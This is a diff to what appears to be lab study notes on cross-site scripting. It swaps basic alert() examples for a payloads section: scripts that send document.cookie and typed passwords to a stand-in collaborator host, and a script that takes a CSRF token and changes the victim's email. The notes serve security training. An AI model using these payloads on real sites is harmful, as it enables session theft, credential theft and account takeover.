@@ -38,16 +38,7 @@
   - [15. Exploiting cross-site scripting to capture passwords](./lab/15.%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords.md)
   - [16. Exploiting XSS to perform CSRF](./lab/16.%20Exploiting%20XSS%20to%20perform%20CSRF.md)
 
-## Summary
-
-Context:
-
-- between html tags:
-
-  ```html
-  <script>alert(document.domain)</script>
-  <img src=1 onerror=alert(1)>
-  ```
+## payloads
 
 auto resize:
 
@@ -58,12 +49,41 @@ auto resize:
 script to steal cookies:
 
 ```js
+<script>
+fetch('https://collaborator', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+script to capture password:
+
+```html
 <input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
 });">
+```
+
+script to csrf:
+
+```js
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
 ```
 
 ## References
